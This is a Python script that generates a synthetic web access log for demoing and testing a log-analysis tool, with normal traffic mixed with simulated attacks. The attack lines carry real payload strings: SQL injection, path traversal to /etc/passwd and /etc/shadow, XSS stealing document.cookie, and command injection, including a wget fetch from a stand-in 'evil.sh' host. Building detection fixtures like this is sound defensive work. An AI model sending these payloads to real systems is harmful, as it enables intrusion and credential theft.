"""
演示日志生成脚本
----------------
构造一份"看起来像真实网站"的 combined 格式访问日志，用于项目演示与测试：

- 约 1.2 万行正常浏览流量，覆盖 24 小时，白天多、凌晨少，为趋势图提供"量感"；
- 混入 7 类典型攻击行为：
    1) dirsearch 目录扫描（单 IP 40 秒 400 次 404，全部命中敏感路径）
    2) Hydra 登录爆破（60 次 401 后出现 1 次 200）
    3) sqlmap SQL 注入（union select / 时间盲注 / 数据窃取 等特征）
    4) 路径遍历（../../etc/passwd 等变体）
    5) XSS（<script> 与 %3Cscript 两种编码形式）
    6) 命令注入（;cat /etc/passwd）
    7) 脚本类爬虫（python-requests，低危 UA）

运行： python tools/gen_demo_log.py
输出： sample_data/demo_access.log
"""

import os
import random
from datetime import datetime, timedelta

random.seed(20260907)

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
OUT = os.path.join(BASE_DIR, 'sample_data', 'demo_access.log')
TZ = '+0800'

# ---------- 正常流量的素材池 ----------
NORMAL_IPS = [
    ('116.24.65.', 12), ('183.6.12.', 10), ('223.104.38.', 9), ('101.226.33.', 8),
    ('58.60.1.', 7), ('14.215.176.', 6), ('202.104.10.', 5), ('121.33.7.', 5),
    ('112.96.23.', 4), ('113.108.5.', 4), ('10.0.0.', 3), ('172.16.8.', 2),
    ('104.28.42.', 3), ('8.210.33.', 3), ('47.98.112.', 2), ('120.26.7.', 2),
]

PAGES = [
    ('/', 28), ('/index.html', 8), ('/article/12345', 7), ('/article/12346', 6),
    ('/article/12347', 3), ('/category/tech', 6), ('/category/life', 4),
    ('/search?q=python', 5), ('/search?q=nginx', 4), ('/api/list?page=2', 5),
    ('/api/list?page=3', 4), ('/static/css/app.css', 8), ('/static/js/app.js', 7),
    ('/static/img/logo.png', 6), ('/favicon.ico', 9), ('/about.html', 3),
    ('/contact.html', 2), ('/login', 4), ('/register', 2), ('/news/2026/09', 3),
    ('/product/1001', 4), ('/product/1002', 3), ('/download/manual.pdf', 2),
    ('/blog/how-to-read-logs', 3), ('/comments?post=42', 2),
]

UAS = [
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 30),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.2420.65', 12),
    ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15', 10),
    ('Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1', 14),
    ('Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36', 12),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0', 8),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 MicroMessenger/8.0.49', 6),
    ('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)', 4),
]

REFERERS = ['-', 'https://www.example.com/', 'https://www.example.com/index.html',
            'https://www.example.com/category/tech', 'https://www.google.com/',
            'https://www.baidu.com/link?url=abc']

# 每小时正常请求量：凌晨低、白天高，制造趋势曲线的昼夜规律
HOUR_WEIGHTS = [130, 85, 70, 85, 120, 190, 360, 560, 720, 820, 870, 860,
                760, 840, 880, 860, 780, 700, 620, 520, 430, 350, 260, 180]


def pick_weighted(items):
    """按权重随机挑一个元素（items 元素形如 (值, 权重)）。"""
    values, weights = zip(*items)
    return random.choices(values, weights=weights, k=1)[0]


# 正常访客 IP 池：由若干网段展开成固定的 60 多个完整 IP，
# 让"独立 IP"数量看起来像真实的小型站点（几千行日志几十个访客）
IP_POOL = []
for _prefix, _weight in NORMAL_IPS:
    for _i in range(max(5, _weight)):
        IP_POOL.append(_prefix + str(random.randint(1, 254)))


def full_ip():
    """从固定 IP 池里挑一个，模拟老访客反复访问。"""
    return random.choice(IP_POOL)


def fmt_time(dt):
    months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
              'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
    return dt.strftime(f'%d/{months[dt.month - 1]}/%Y:%H:%M:%S') + f' {TZ}'


def line(ip, dt, method, path, status, size, referer, ua, protocol='HTTP/1.1'):
    """拼一行标准 combined 日志。"""
    return (f'{ip} - - [{fmt_time(dt)}] "{method} {path} {protocol}" '
            f'{status} {size} "{referer}" "{ua}"')


def gen_normal():
    """生成 24 小时正常浏览流量。"""
    start = datetime(2026, 9, 7, 0, 0, 0)
    lines = []
    for hour in range(24):
        count = int(HOUR_WEIGHTS[hour] * 1.08)
        # 白天叠加一点波动，避免每小时数字过于死板
        count += random.randint(-12, 12)
        for _ in range(count):
            dt = start + timedelta(hours=hour, seconds=random.randint(0, 3599))
            ip = full_ip()
            path = pick_weighted(PAGES)
            ua = pick_weighted(UAS)
            method = 'GET'
            if random.random() < 0.10:
                method = 'POST'
            elif random.random() < 0.03:
                method = 'HEAD'

            # 状态码分布：以 200 为主，少量 304/302/404/401/500
            r = random.random()
            if r < 0.855:
                status, size = 200, random.randint(400, 24000)
            elif r < 0.925:
                status, size = 304, 0
            elif r < 0.955:
                status, size = 302, random.randint(100, 900)
            elif r < 0.985:
                status, size = 404, random.randint(80, 400)
            elif r < 0.995:
                status, size = 401, random.randint(80, 400)
            else:
                status, size = 500, random.randint(100, 900)

            lines.append(line(ip, dt, method, path, status, size,
                              random.choice(REFERERS), ua))
    return lines


def gen_dirsearch_scan():
    """dirsearch 目录扫描：40 秒 400 次请求，全部 404，路径全是敏感文件。"""
    lines = []
    start = datetime(2026, 9, 7, 3, 31, 0)
    ua = 'dirsearch/0.4.3'
    paths = ['.git/config', '.git/HEAD', '.env', '.env.bak', 'phpinfo.php', 'phpmyadmin/',
             'wp-login.php', 'backup.zip', 'config.php.bak', 'adminer.php', 'shell.php',
             '.svn/entries', '.DS_Store', 'wp-content/plugins/', 'database.sql']
    for i in range(400):
        dt = start + timedelta(seconds=i * 0.1)   # 40 秒内打完
        path = '/' + random.choice(paths)
        lines.append(line('66.102.9.15', dt, 'GET', path, 404, 146, '-', ua))
    return lines


def gen_nikto_scan():
    """nikto 漏洞扫描：零散探测若干危险路径。"""
    lines = []
    paths = ['/admin/', '/cgi-bin/test.cgi', '/server-status', '/.htaccess',
             '/phpinfo.php', '/backup.zip', '/wp-login.php']
    for i, p in enumerate(paths * 4):
        dt = datetime(2026, 9, 7, 2, 10, 0) + timedelta(seconds=i * 7)
        status = 404 if i % 3 else 200
        lines.append(line('203.0.113.66', dt, 'GET', p, status,
                          random.randint(100, 300), '-', 'nikto/2.5.0'))
    return lines


def gen_hydra_bruteforce():
    """Hydra 登录爆破：60 次 401，最后 1 次 200（账户可能已被攻破）。"""
    lines = []
    start = datetime(2026, 9, 7, 4, 5, 12)
    for i in range(60):
        dt = start + timedelta(seconds=i * 3)
        lines.append(line('45.148.10.88', dt, 'POST', '/login', 401, 189, '-', 'Hydra/9.4'))
    # 爆破成功的那一次
    dt = start + timedelta(seconds=60 * 3 + 3)
    lines.append(line('45.148.10.88', dt, 'POST', '/login', 200, 1204, '-', 'Hydra/9.4'))
    return lines


def gen_sqlmap():
    """sqlmap SQL 注入：联合查询、时间盲注、数据窃取、恒真条件等 15 条。"""
    payloads = [
        ('/article?id=1 UNION SELECT username,password FROM users', 500),
        ('/article?id=1 union select 1,2,3,4', 500),
        ('/article?id=1 AND 1=1', 200),
        ('/article?id=1 AND 1=2', 200),
        ('/article?id=1 OR 1=1', 200),
        ('/article?id=1;WAITFOR DELAY \'0:0:5\'', 500),
        ('/article?id=1 AND SLEEP(5)', 500),
        ('/article?id=1 UNION SELECT 1,2,table_name FROM information_schema.tables', 500),
        ('/article?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))', 500),
        ('/product?id=2 UNION/**/SELECT/**/1,2', 500),
        ('/article?id=-1\' UNION SELECT 1,2,3-- -', 500),
        ('/article?id=1 AND (SELECT 1 FROM (SELECT SLEEP(3))a)', 500),
        ('/api/list?page=1;SELECT * FROM users', 500),
        ('/article?id=1 AND 1=1 AND 2=2', 200),
        ('/article?id=1 UNION SELECT LOAD_FILE(\'/etc/passwd\')', 500),
    ]
    lines = []
    base = datetime(2026, 9, 7, 5, 0, 0)
    for i, (p, st) in enumerate(payloads):
        dt = base + timedelta(seconds=i * 80 + random.randint(0, 40))
        lines.append(line('198.51.100.7', dt, 'GET', p, st,
                          random.randint(300, 900), '-', 'sqlmap/1.7.2#stable'))
    return lines


def gen_traversal():
    """路径遍历：三种常见绕过写法，来自三个不同来源 IP。"""
    cases = [
        ('185.220.101.5', '/download?file=../../../../etc/passwd'),
        ('185.220.101.5', '/download?file=../../../../etc/shadow'),
        ('103.75.190.12', '/static/..%2f..%2f..%2fetc%2fpasswd'),
        ('103.75.190.12', '/files/....//....//etc/passwd'),
        ('61.177.7.29', '/include.php?page=..\\..\\windows\\win.ini'),
    ]
    lines = []
    for i, (ip, p) in enumerate(cases):
        dt = datetime(2026, 9, 7, 6, 20, 0) + timedelta(seconds=i * 95)
        lines.append(line(ip, dt, 'GET', p, 404 if i % 2 else 200,
                          random.randint(200, 1800), '-', 'Mozilla/5.0 (X11; Linux x86_64)'))
    return lines


def gen_xss_cmd():
    """XSS 与命令注入：原文与 URL 编码两种形态。"""
    cases = [
        ('91.219.236.44', '/search?q=<script>alert(1)</script>', 200),
        ('91.219.236.44', '/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E', 200),
        ('91.219.236.44', '/comment?text=<img src=x onerror=alert(1)>', 200),
        ('41.203.72.18', '/ping?host=127.0.0.1;cat%20/etc/passwd', 500),
        ('41.203.72.18', '/ping?host=127.0.0.1|whoami', 500),
        ('41.203.72.18', '/tool?url=http://x.com&&wget%20http://evil.sh', 500),
    ]
    lines = []
    for i, (ip, p, st) in enumerate(cases):
        dt = datetime(2026, 9, 7, 7, 5, 0) + timedelta(seconds=i * 40)
        lines.append(line(ip, dt, 'GET', p, st, random.randint(300, 1200), '-',
                          'Mozilla/5.0 (Windows NT 10.0)'))
    return lines


def gen_browser_probe():
    """用普通浏览器 UA 手工探测敏感路径：只命中"敏感路径探测"（中危），
    用来演示"特征命中但风险等级不高"的情况。"""
    lines = []
    ua = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
          '(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36')
    paths = ['/.git/config', '/.env', '/backup.zip', '/phpmyadmin/', '/wp-login.php']
    for i, p in enumerate(paths):
        dt = datetime(2026, 9, 7, 9, 15, 0) + timedelta(seconds=i * 25)
        lines.append(line('61.160.35.2', dt, 'GET', p, 404,
                          random.randint(100, 300), 'https://www.example.com/', ua))
    return lines


def gen_script_ua():
    """脚本类 UA：空 UA + python-requests 爬虫，用于展示"低危提示"。"""
    lines = []
    for i in range(35):
        dt = datetime(2026, 9, 7, 8, 0, 0) + timedelta(seconds=i * 30)
        path = random.choice(['/api/list?page=1', '/api/list?page=2', '/', '/api/list?page=5'])
        ua = 'python-requests/2.31.0' if i % 5 else ''
        lines.append(line('54.36.148.201', dt, 'GET', path, 200,
                          random.randint(200, 900), '-', ua))
    return lines


def main():
    lines = []
    lines += gen_normal()
    lines += gen_dirsearch_scan()
    lines += gen_nikto_scan()
    lines += gen_hydra_bruteforce()
    lines += gen_sqlmap()
    lines += gen_traversal()
    lines += gen_xss_cmd()
    lines += gen_browser_probe()
    lines += gen_script_ua()

    # 按时间排序，真实日志一定是有序追加的
    def sort_key(text):
        return text.split('[', 1)[1].split(']', 1)[0]

    lines.sort(key=sort_key)

    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    with open(OUT, 'w', encoding='utf-8', newline='\n') as f:
        f.write('\n'.join(lines) + '\n')

    print(f'已生成 {len(lines)} 行日志 → {OUT}')


if __name__ == '__main__':
    main()
